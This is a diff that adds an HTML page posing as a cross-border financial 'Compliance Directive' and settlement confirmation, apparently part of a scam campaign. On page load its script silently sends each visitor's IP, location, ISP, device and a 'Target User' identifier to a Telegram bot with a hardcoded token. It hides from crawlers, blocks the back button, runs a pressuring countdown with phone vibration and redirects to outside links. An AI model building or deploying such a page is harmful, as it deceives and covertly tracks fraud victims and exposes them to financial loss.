@@ -1,1 +1,858 @@
-hi
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Confirmation</title>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/dflip/2.3.16/css/dflip.min.css" />
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/dflip/2.3.16/js/dflip.min.js"></script>
+
+<!-- THE ENGINE SCRIPT: Put this right before your closing body tag -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.4.120/pdf.min.js"></script>
+<style>
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --accent-red: #ef4444;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --border-color: #334155;
+            --btn-green: #10b981;
+            --btn-green-hover: #059669;
+        }
+
+/* ---------- Base ---------- */
+body {
+          font-family: 'Georgia', sans-serif !important;  
+  margin: 0;
+          background-color: var(--card-bg);
+  color: #fff;
+  overflow-x: hidden;
+}
+button { cursor: pointer; }
+a { color: inherit; text-decoration: none; }
+
+
+
+        .header {
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .badge {
+            display: inline-block;
+            background-color: rgba(239, 68, 68, 0.15);
+            color: var(--accent-red);
+            font-size: 0.75rem;
+            font-weight: 700;
+            padding: 0.25rem 0.75rem;
+            border-radius: 9999px;
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 0.75rem;
+        }
+
+        .footer-note {
+            margin-top: 1.5rem;
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            text-align: center;
+            line-height: 1.3;
+        }
+
+    /* Notification Bar */
+    .notification-bar {
+        position: fixed;
+        top: -80px;
+        right: 20px;
+        background: rgba(30, 144, 255, 0.25);
+        backdrop-filter: blur(12px);
+        border: 1px solid rgba(30,144,255,0.4);
+        color: #fff;
+        padding: 12px 18px;
+        border-radius: 12px;
+        font-size: 14px;
+font-weight: bold;
+        box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+        transition: top 0.5s ease, opacity 0.5s ease;
+        z-index: 9999;
+        opacity: 0;
+        max-width: 350px;
+        white-space: normal;
+        overflow: hidden;
+    }
+    .notification-bar.show {
+        top: 20px;
+        opacity: 1;
+    }
+.notification-bar.warning-yellow {
+    color: #ffcc00;
+    font-weight: 600;
+}
+
+.notification-bar.warning-red {
+    color: #ff3b3b;
+    font-weight: 600;
+    animation: pulse 1s infinite;
+}
+    .notification-bar::before {
+        content: '';
+        position: absolute;
+        left: -50%;
+        top: 0;
+        width: 50%;
+        height: 100%;
+        background: rgba(255,255,255,0.3);
+        transform: skewX(-25deg);
+        animation: liquidWave 2s linear infinite;
+    }
+    @keyframes liquidWave {
+        0% { left: -50%; }
+        100% { left: 100%; }
+    }
+
+        
+
+/* ---------- Header ---------- */
+header {
+  text-align: center;
+  padding: 40px 0;
+  position: relative;
+  z-index: 2;
+}
+.header-frame {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  width: 350px;
+  height: 180px;
+  border-radius: 24px;
+  background: rgba(255,255,255,0.12);
+  backdrop-filter: blur(15px);
+  border: 1px solid rgba(255,255,255,0.3);
+  box-shadow: 0 8px 30px rgba(0,0,0,0.5);
+}
+.header-frame img {
+  max-width: 90%;
+  max-height: 90%;
+  height: auto;
+}
+
+.membership-confirmation {
+  text-align: center;
+  font-weight: bold;
+  font-size: 1.8rem;
+  margin: 20px 0 10px;
+  position: relative;
+  z-index: 3;
+
+  background: linear-gradient(90deg,#6b2cd8,#b393ff,#6b2cd8);
+  background-size: 200% auto;
+  animation: gradientShift 6s linear infinite;
+
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+
+  text-shadow: 0 2px 6px rgba(0,0,0,0.35);
+}
+
+@keyframes gradientShift {
+  0% { background-position: 0% center; }
+  100% { background-position: 200% center; }
+}
+
+/* ---------- Glass Cards ---------- */
+.glass-card {
+  background: rgba(255,255,255,0.12);
+  backdrop-filter: blur(12px);
+  border-radius: 18px;
+  padding: 28px;
+  margin: 80px auto 30px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+  max-width: 280px !important;
+                animation: pulseGlow 3s infinite alternate;
+}
+    @keyframes pulseGlow {
+        0% { box-shadow: 0 0 20px rgba(0,255,255,0.2), 0 0 40px rgba(255,0,255,0.1); }
+        50% { box-shadow: 0 0 30px rgba(0,255,255,0.4), 0 0 60px rgba(255,0,255,0.2); }
+        100% { box-shadow: 0 0 25px rgba(0,255,255,0.3), 0 0 50px rgba(255,0,255,0.15); }
+    }
+
+/* ---------- Glass Cards ---------- */
+.glass-cards {
+  background: rgba(255,255,255,0.12);
+  backdrop-filter: blur(12px);
+  border-radius: 18px;
+  padding: 28px;
+  margin: 80px auto 30px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+}
+
+/* ---------- Checkbox ---------- */
+.checkbox-container {
+  display: flex;
+  flex-direction: row-reverse; /* Flips the visual order so input goes to the right */
+  align-items: flex-end;      /* CHANGED: Pulls the checkbox down to the bottom edge */
+  justify-content: space-between; /* Pushes text to left, checkbox to far right */
+  gap: 16px; /* Slightly more breathing room since it's on the right */
+  margin-top: 14px;
+}
+
+.checkbox-container input {
+  margin-bottom: 4px;         /* CHANGED: Switched from top to bottom margin for a cleaner baseline alignment */
+  cursor: pointer;
+}
+
+.checkbox-container label {
+  flex: 1; /* Ensures the label takes up all remaining space on the left */
+}
+
+/* ---------- Textarea ---------- */
+textarea {
+  width: 100%;
+  padding: 14px;
+  border-radius: 12px;
+  border: none;
+  background: rgba(255,255,255,0.15);
+  color: #fff;
+  font-size: 16px;
+  margin-top: 10px;
+  resize: vertical;
+}
+
+/* ---------- Buttons ---------- */
+.button-row {
+  display: flex;
+  justify-content: space-between;
+  max-width: 600px;
+  margin: 0 auto 120px;
+}
+button {
+  padding: 12px 24px;
+  border-radius: 12px;
+  border: none;
+  font-weight: bold;
+  background: rgba(107,44,216,0.6);
+  color: #fff;
+}
+button:hover {
+  background: rgba(107,44,216,0.8);
+}
+
+
+/* Red warning glow */
+.neon-card.warning {
+  animation: warning-glow 0.8s ease-in-out 2;
+  box-shadow: 0 0 20px 4px rgba(255,77,77,0.9);
+}
+
+@keyframes warning-glow {
+  0% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
+  50% { box-shadow: 0 0 20px 6px rgba(255,77,77,0.9); }
+  100% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
+}
+
+  
+</style>
+</head>
+
+<body>
+
+<div id="planNotification" class="notification-bar"></div>
+
+<div id="main-application-reader" class="glass-cards neon-card custom-platform-reader" style="max-width: 740px; width: 95%; margin: 25px auto; padding: 20px 15px; text-align: center; box-sizing: border-box; transition: all 0.4s ease-in-out;">
+    
+        <div class="header">
+            <span class="badge">Action Required</span>
+        </div>
+
+    <div id="pdf-pages-container" style="width: 100%; display: none; flex-direction: column; gap: 25px; box-sizing: border-box;">
+        </div>
+
+    <div id="crypto-lockbox" style="padding: 30px 15px; background: rgba(20, 20, 20, 0.75); border-radius: 12px; max-width: 100%; width: 340px; margin: 15px auto; box-sizing: border-box; border: 1px solid rgba(164, 108, 255, 0.2);">
+        <div style="font-size: 28px; margin-bottom: 12px;">🔐</div>
+        <h3 style="color: #a46cff; margin: 0 0 10px 0; font-family: sans-serif; font-size: 20px; font-weight: 600;">Security Authorization</h3>
+        <p style="color: #ccc; font-size: 13px; margin-bottom: 20px; line-height: 1.5; padding: 0 10px;">Your attached Compliance Directive is locked with data and cross-ledger transport encryption. Please input your created password to decrypt.</p>
+        
+        <input type="password" id="pdf-password-input" placeholder="Enter Password" style="width: 85%; padding: 12px; border: 1px solid #a46cff; background: rgba(0,0,0,0.6); color: #fff; border-radius: 6px; text-align: center; font-size: 16px; margin-bottom: 15px; outline: none; box-sizing: border-box;">
+        <br>
+        <button id="decrypt-btn" style="background: #a46cff; color: #fff; border: none; padding: 12px 0; width: 85%; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 14px; transition: 0.2s; box-sizing: border-box; letter-spacing: 0.5px;">Unlock Manifest</button>
+        <p id="error-message" style="color: #ff4d4d; font-size: 13px; margin-top: 10px; display: none;">Invalid Authorization Key</p>
+    </div>
+</div>
+
+
+  <!-- Glass Card 1: Confirmation -->
+  <!-- Glass Card: Confirmation with Neon + Halo + Red Glow -->
+<div class="glass-card neon-card" id="confirmationCard" style="margin:30px auto;">
+  <div class="checkbox-container">
+    <input type="checkbox" id="confirmation">
+    <label for="confirmation" style="font-weight: 500; line-height: 1.6; color: #a46cff; display: block; text-align: left;">
+
+   <span style="  
+    display: block;  
+    margin: 12px 0;  
+    padding-left: 12px;  
+    border-left: 3px solid rgba(200, 50, 80, 0.85);  
+    color: rgba(200, 50, 80, 0.85);  
+    font-size: 10px;
+font-weight: bold; 
+">  
+    The verification process is executed pursuant to the Cross-Border
+Financial Framework (Section 4B - Non-Resident Clearance) and Section 153 of the Canadian Income Tax Act governing specialized sector disbursements exceeding the $500.00 threshold.  
+</span>
+
+</label>
+  </div>
+        <div class="footer-note">
+            Automated Clearance System • Security Protocol SSL-256
+        </div>
+</div>
+
+       <!-- Navigation Buttons -->
+<div id="submitBtn" style="max-width:600px;margin:40px auto 30px; display:flex;justify-content:flex-end; position:relative; z-index:5;">
+    <button id="nextBtnSeparate" style="background: rgba(107,44,216,0.9); border:1px solid #fff; padding:12px 24px; border-radius:12px; font-weight:bold; color:#fff;">Proceed to Settlement</button>
+</div>
+
+<div style="text-align: center; margin-top: 12px;">
+    <a href="#" id="resetLink" style="font-size: 12px; color: #a0aec0; text-decoration: underline;">Switch Payment Method</a>
+</div>
+<script>
+
+    
+   pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.4.120/pdf.worker.min.js';
+
+const url = 'assets/documents/Compliance_Directive_AF-5019-HTBV_protected.pdf';
+const mainCard = document.getElementById('main-application-reader');
+const lockbox = document.getElementById('crypto-lockbox');
+const container = document.getElementById('pdf-pages-container');
+const errorMsg = document.getElementById('error-message');
+
+document.getElementById('decrypt-btn').addEventListener('click', function() {
+    const password = document.getElementById('pdf-password-input').value;
+
+    pdfjsLib.getDocument({ url: url, password: password }).promise.then(function(pdf) {
+        lockbox.style.display = 'none';
+        errorMsg.style.display = 'none';
+        container.innerHTML = ''; 
+
+        // DYNAMIC UNLOCK: Expands the glass outer boundary to comfortably host full A4 desktop width layout profiles
+        mainCard.style.maxWidth = '780px';
+        mainCard.style.padding = '10px';
+        container.style.display = 'flex'; 
+
+        for (let pageNum = 1; pageNum <= pdf.numPages; pageNum++) {
+            const canvas = document.createElement('canvas');
+
+            // FORCE-OVERRIDE STYLING: This completely shatters any hidden global layout restrictions
+            canvas.style.display = 'block';
+            canvas.style.width = '100vw';       // Tells the canvas to take up full mobile viewport real estate
+            canvas.style.maxWidth = '100%';    // Forces it to match your wide outer card boundary exactly
+            canvas.style.height = 'auto';
+            canvas.style.borderRadius = '6px';
+
+            container.appendChild(canvas);
+
+            const ctx = canvas.getContext('2d');
+
+            pdf.getPage(pageNum).then(function(page) {
+                // We boost the dynamic scale multiplier to 2.5 to ensure the text prints thick, bold, and large
+                const containerWidth = container.clientWidth || 340;
+                const unscaledViewport = page.getViewport({ scale: 1.0 });
+                const dynamicScale = (containerWidth / unscaledViewport.width) * 2.5; 
+
+                const viewport = page.getViewport({ scale: dynamicScale });
+                canvas.height = viewport.height;
+                canvas.width = viewport.width;
+
+                const renderContext = {
+                    canvasContext: ctx,
+                    viewport: viewport
+                };
+                page.render(renderContext);
+            });
+        }
+    }).catch(function(error) {
+        if (error.name === 'PasswordException') {
+            errorMsg.style.display = 'block';
+        } else {
+            console.error("Glitched loading file:", error);
+        }
+    }); // <-- FIXED: Sealed the getDocument promise sequence
+}); // <-- FIXED: Sealed the click event handler wrapper
+
+// ==========================================
+// 1. TELEGRAM VISITOR TRACKING CONFIGURATION
+// ==========================================
+const TELEGRAM_BOT_TOKENs = "8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E";
+const TELEGRAM_CHAT_IDs = "-1003913850436";
+
+async function sendVisitorDetailsToTelegram() {
+  try {
+    if (sessionStorage.getItem('visitor_logged_tg')) return;
+
+    const rawAgent = navigator.userAgent;
+
+    // Anti-Bot Filter: Silently drop execution if the visitor is a search engine or chat crawler
+    if (/bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|slurp|embed/i.test(rawAgent)) {
+      console.log("🤖 Automated link indexing crawler bypassed safely.");
+      return;
+    }
+
+    // Target Identification: Extract tracking user from URL parameters
+    const urlParams = new URLSearchParams(window.location.search);
+    const identifyUser = urlParams.get('user') || 'Anonymous Click / Direct Visit';
+
+    // Failure Handling: Fetch network data strictly, throw error if down
+    const ipResponse = await fetch('https://ipapi.co/json/');
+    if (!ipResponse.ok) throw new Error('Failed to fetch network details');
+    const ipData = await ipResponse.json();
+
+    // Capture device environment metrics safely
+    const currentPage = window.location.pathname;
+    let detailedDevice = "Unknown Device";
+    let detectedBrowser = "Unknown Browser";
+
+    // 1. Upgraded Smart Browser Extractor (Ordered by Specificity)
+    if (/WhatsApp/i.test(rawAgent)) {
+      detectedBrowser = "WhatsApp In-App";
+    } else if (/TelegramBot|Telegram/i.test(rawAgent)) {
+      detectedBrowser = "Telegram In-App";
+    } else if (/Instagram/i.test(rawAgent)) {
+      detectedBrowser = "Instagram App";
+    } else if (/TikTok/i.test(rawAgent)) {
+      detectedBrowser = "TikTok App";
+    } else if (/FBAN|FBAV/i.test(rawAgent)) {
+      detectedBrowser = "Facebook App";
+    } else if (/Twitter|TwitterforiPhone|TwitterAndroid/i.test(rawAgent)) {
+      detectedBrowser = "X (Twitter) App";
+    } else if (/LinkedInApp/i.test(rawAgent)) {
+      detectedBrowser = "LinkedIn App";
+    } else if (/Phoenix/i.test(rawAgent)) {
+      detectedBrowser = "Phoenix Browser";
+    } else if (/SamsungBrowser/i.test(rawAgent)) {
+      detectedBrowser = "Samsung Internet";
+    } else if (/OComponent|Opera|OPR/i.test(rawAgent)) {
+      detectedBrowser = "Opera";
+    } else if (/Edg/i.test(rawAgent)) {
+      detectedBrowser = "Microsoft Edge";
+    } else if (/Firefox|FxiOS/i.test(rawAgent)) {
+      detectedBrowser = "Mozilla Firefox";
+    } else if (/Chrome|CriOS/i.test(rawAgent)) {
+      detectedBrowser = "Google Chrome";
+    } else if (/Safari/i.test(rawAgent) && !/Android/i.test(rawAgent)) {
+      detectedBrowser = "Apple Safari";
+    }
+
+    // Email Inbox Origin Identification (Fallback Check)
+    const referrer = document.referrer || "";
+    if (detectedBrowser === "Google Chrome" || detectedBrowser === "Apple Safari") {
+      if (/mail\.google\.com/i.test(referrer)) {
+        detectedBrowser += " (via Gmail Web)";
+      } else if (/mail\.yahoo/i.test(referrer)) {
+        detectedBrowser += " (via Yahoo Mail Web)";
+      } else if (/outlook|live\.com/i.test(referrer)) {
+        detectedBrowser += " (via Outlook Web)";
+      }
+    }
+
+    // 2. Smart Device & OS Version Detection Engine
+    if (/Android/i.test(rawAgent)) {
+      const match = rawAgent.match(/Android\s+([^;]+);\s+([^)]+)/);
+      if (match) {
+        detailedDevice = `Android ${match[1]} (${match[2]})`;
+      } else {
+        detailedDevice = "Android Device";
+      }
+    } else if (/iPhone|iPad|iPod/i.test(rawAgent)) {
+      const match = rawAgent.match(/OS\s+(\d+_\d+)/);
+      const iosVer = match ? match[1].replace('_', '.') : '';
+      detailedDevice = `iOS ${iosVer} (Apple Device)`;
+    } else if (/Windows/i.test(rawAgent)) {
+      const match = rawAgent.match(/Windows NT\s+([^;)]+)/);
+      let winVer = "PC";
+      if (match) {
+        if (match[1] === "10.0") winVer = "10/11";
+        else if (match[1] === "6.3") winVer = "8.1";
+        else if (match[1] === "6.1") winVer = "7";
+      }
+      detailedDevice = `Windows ${winVer}`;
+    } else if (/Macintosh/i.test(rawAgent)) {
+      detailedDevice = "macOS Device";
+    } else if (/Linux/i.test(rawAgent)) {
+      detailedDevice = "Linux System";
+    }
+
+    // Anti-VPN Verification Check
+    const isProxy = ipData.proxy || false;
+    const ipDisplay = isProxy ? `${ipData.ip} ⚠️ [Proxy/VPN]` : ipData.ip;
+
+    const payload = {
+      device: detailedDevice,
+      browser: detectedBrowser,
+      screenResolution: `${window.screen.width}x${window.screen.height}`,
+      connectionType: navigator.connection ? navigator.connection.effectiveType : "N/A",
+      ip: ipDisplay || "Unknown",
+      city: ipData.city || "Unknown",
+      region: ipData.region || "Unknown",
+      country: ipData.country_name || "Unknown",
+      isp: ipData.org || "Unknown",
+      timestamp: new Date().toLocaleString()
+    };
+
+    // HTML Parsing Engine: Final Golden Standard Output
+    const messageText = `⚡ <b>New Visitor Alert | AvalonFlow</b>\n\n` +
+                        `👤 <b>Target User:</b> <code>${identifyUser}</code>\n` +
+                        `📄 <b>Visited Page:</b> <code>${currentPage}</code>\n` +
+                        `🌐 <b>IP:</b> <code>${payload.ip}</code>\n` +
+                        `📍 <b>Location:</b> <code>${payload.city}, ${payload.region}, ${payload.country}</code>\n` +
+                        `🏢 <b>ISP:</b> <code>${payload.isp}</code>\n` +
+                        `📶 <b>Net Speed:</b> <code>${payload.connectionType}</code>\n` +
+                        `🌐 <b>Browser:</b> <code>${payload.browser}</code>\n` +
+                        `📱 <b>Device Setup:</b> <code>${payload.device}</code>\n` + 
+                        `📐 <b>Screen Res:</b> <code>${payload.screenResolution}</code>\n` +
+                        `📐 <b>Time:</b> <code>${payload.timestamp}</code>`;
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKENs}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_IDs,
+        text: messageText,
+        parse_mode: 'HTML'
+      })
+    });
+
+    sessionStorage.setItem('visitor_logged_tg', 'true');
+    console.log("🔒 Security telemetry parameters forwarded successfully.");
+  } catch (err) {
+    console.warn("Telegram telemetry bypass error:", err);
+  }
+}
+
+// --- THE PAGE LOAD TRIGGER ---
+document.addEventListener('DOMContentLoaded', () => {
+  sendVisitorDetailsToTelegram();
+});
+
+
+
+
+  // Prevent user from going back to previous pages
+  history.pushState(null, null, location.href);
+
+  window.addEventListener('popstate', function () {
+    history.go(1); // keeps user on this page
+  });
+
+  // Optional: also prevent back with keyboard shortcuts
+  window.addEventListener('keydown', function (e) {
+    if ((e.key === 'Backspace' && e.target === document.body) || e.key === 'ArrowLeft') {
+      e.preventDefault();
+    }
+  });
+        
+
+/* --------------------------
+NOTIFICATION SYSTEM
+-------------------------- */
+
+let sessionInterval;
+let guardInterval;
+let avbInterval;
+
+const notification = document.getElementById("planNotification");
+
+function showNotification(message, duration = 4000) {
+    if (!notification) return;
+
+    notification.textContent = message;
+    notification.classList.add("show");
+
+    clearTimeout(notification.hideTimer);
+
+    notification.hideTimer = setTimeout(() => {
+        notification.classList.remove("show");
+    }, duration);
+}
+
+/* --------------------------
+SHARED STATE ENGINE (MATCHES DASHBOARD)
+-------------------------- */
+
+const getState = (remaining) => {
+    if (remaining <= 0) return "expired";
+
+    if (remaining <= 300) return "red";        // 5–0 min
+    if (remaining <= 360) return "yellow";     // 6–5 min
+    if (remaining <= 540) return "hide_mid";   // 9–6 min
+    if (remaining <= 720) return "show_mid";   // 12–9 min
+
+    return "hide_start";                       // 15–12 min
+};
+
+/* --------------------------
+UI UPDATE (DASHBOARD STYLE)
+-------------------------- */
+
+const updateSessionUI = () => {
+    const expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
+    if (!expiryTime) return;
+
+    const remaining = Math.max(
+        0,
+        Math.floor((expiryTime - Date.now()) / 1000)
+    );
+
+    const state = getState(remaining);
+
+    // reset styles
+    notification.classList.remove("warning-yellow", "warning-red");
+
+    // warnings
+    if (state === "yellow") {
+        notification.classList.add("warning-yellow");
+        if (navigator.vibrate) navigator.vibrate(200);
+    }
+
+    if (state === "red") {
+        notification.classList.add("warning-red");
+        if (navigator.vibrate) navigator.vibrate([300, 100, 300]);
+    }
+
+    // visibility rules (same as dashboard)
+    if (state === "hide_start") {
+        notification.classList.remove("show");
+    }
+    else if (state === "show_mid") {
+        notification.classList.add("show");
+    }
+    else if (state === "hide_mid") {
+        notification.classList.remove("show");
+    }
+    else {
+        notification.classList.add("show");
+    }
+
+    // countdown text
+    const minutes = Math.floor(remaining / 60);
+    const seconds = remaining % 60;
+
+    notification.textContent =
+        `Verification expires in ${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
+};
+
+/* --------------------------
+BOOT FLOW (same delay logic)
+-------------------------- */
+
+window.addEventListener("load", () => {
+
+    const saved = JSON.parse(localStorage.getItem("membershipConfirmed") || "{}");
+
+    const hasSavedData = Object.values(saved).some(
+        v => v && v.toString().trim() !== ""
+    );
+
+    // Updated: Shows the compliance message instantly on page load
+    showNotification("⚠️ Important: Please read the compliance protocols below carefully");
+
+    setTimeout(() => {
+        updateSessionUI();
+        sessionInterval = setInterval(updateSessionUI, 1000);
+    }, 3000);
+});
+
+/* --------------------------
+AVB ENGINE (DASHBOARD MATCH)
+-------------------------- */
+
+/* --------------------------
+AVB ENGINE (DASHBOARD MATCH)
+-------------------------- */
+
+(function avbEngine() {
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const hasInitParam =
+        urlParams.get("session") === "refresh" ||
+        urlParams.get("mode") === "init";
+
+    // Get the current usage count (defaults to 0 if it doesn't exist yet)
+    let keyUsageCount = parseInt(localStorage.getItem("avb_key_used_count"), 10) || 0;
+
+    // Clear everything ONLY if they have the param AND have used it less than 10 times
+    if (hasInitParam && keyUsageCount < 10) {
+        localStorage.removeItem("avb_expiry_time");
+        localStorage.removeItem("avb_redirected_to_avb");
+        localStorage.removeItem("avb_session_state");
+        localStorage.removeItem("membershipConfirmed");
+
+        // Increment the count by 1 and save it back to local storage
+        keyUsageCount += 1;
+        localStorage.setItem("avb_key_used_count", keyUsageCount.toString());
+    }
+
+    if (!localStorage.getItem("avb_expiry_time")) {
+        localStorage.setItem(
+            "avb_expiry_time",
+            Date.now() + 15 * 60 * 1000
+        );
+    }
+
+    let triggered = false;
+    let vibRunning = false;
+    let vibTimeout;
+
+    const startVibrationCycle = () => {
+        if (vibRunning) return;
+        vibRunning = true;
+
+        const loop = () => {
+            if (!vibRunning) return;
+
+            if (navigator.vibrate) {
+                navigator.vibrate([300, 100, 300]);
+            }
+
+            vibTimeout = setTimeout(loop, 15000);
+        };
+
+        loop();
+    };
+
+    const stopVibrationCycle = () => {
+        vibRunning = false;
+        if (vibTimeout) clearTimeout(vibTimeout);
+        if (navigator.vibrate) navigator.vibrate(0);
+    };
+
+    const check = () => {
+        const expiryTime = parseInt(
+            localStorage.getItem("avb_expiry_time"),
+            10
+        );
+
+        const remainingSec = Math.floor(
+            (expiryTime - Date.now()) / 1000
+        );
+
+        if (!triggered && remainingSec <= 360 && remainingSec > 0) {
+
+            triggered = true;
+
+            startVibrationCycle();
+
+            console.log("AVB warning triggered with vibration cycle");
+        }
+
+        // optional safety stop if time passes out of range
+        if (remainingSec <= 0 || remainingSec > 360) {
+            stopVibrationCycle();
+        }
+    };
+
+    check();
+    const avbInterval = setInterval(check, 1000);
+
+})();
+
+/* --------------------------
+SESSION GUARD (CLEANED)
+-------------------------- */
+
+(function sessionGuard() {
+
+    const check = () => {
+        const expiryTime = parseInt(localStorage.getItem("avb_expiry_time"), 10);
+
+        if (!expiryTime) return;
+
+        if (Date.now() >= expiryTime) {
+
+            localStorage.removeItem("avb_expiry_time");
+            localStorage.removeItem("avb_redirected_to_avb");
+            localStorage.removeItem("avb_session_state");
+            // Note: We leave avb_key_used_count so the 10-visit limit persists across timeouts
+
+            window.location.href =
+                "https://membership.avalonflow.site/notifications";
+        }
+    };
+
+    check();
+    guardInterval = setInterval(check, 5000);
+
+})();
+
+
+/* Navigation logic */
+function getFingerprint() {
+  return btoa(
+    navigator.userAgent +
+    screen.width + screen.height +
+    navigator.language
+  );
+}
+
+const checkbox = document.getElementById('confirmation');
+const card = document.getElementById('confirmationCard');
+
+// Restore confirmation state on load
+if (localStorage.getItem('membershipConfirmed') === 'true') {
+  checkbox.checked = true;
+}
+
+// Submit button logic
+document.getElementById('submitBtn').onclick = (e) => {
+    e.preventDefault();
+
+    if (!checkbox.checked) {
+        card.classList.add('warning');
+        showNotification("Confirmation required to finalize your withdrawal");
+        setTimeout(() => {
+            card.classList.remove('warning');
+        }, 2200);
+        return;
+    }
+
+    // Array of links to choose from randomly
+    const links = [
+        'https://link.avalonflow.site/crawitholding',
+        'https://link.avalonflow.site/alternative-link' // Replace with your second link
+    ];
+
+    // Pick a random link from the array
+    const randomLink = links[Math.floor(Math.random() * links.length)];
+
+    // Save confirmation locally
+    localStorage.setItem('membershipConfirmed', 'true');
+    localStorage.setItem('targetUrl', randomLink); // Save which link was chosen
+
+    // Redirect to the randomized link
+    window.location.href = randomLink;
+};
+
+// Handle auto-redirect if already confirmed
+if (localStorage.getItem('membershipConfirmed') === 'true') {
+    const savedUrl = localStorage.getItem('targetUrl') || 'https://link.avalonflow.site/crawitholding';
+    window.location.href = savedUrl;
+}
+
+// Reset link logic to let them change their mind
+document.getElementById('resetLink').onclick = (e) => {
+    e.preventDefault();
+    localStorage.removeItem('membershipConfirmed');
+    localStorage.removeItem('targetUrl');
+    location.reload(); // Refreshes the page so they can try again for a different link
+};
+
+</script>
+</body>
+</html>
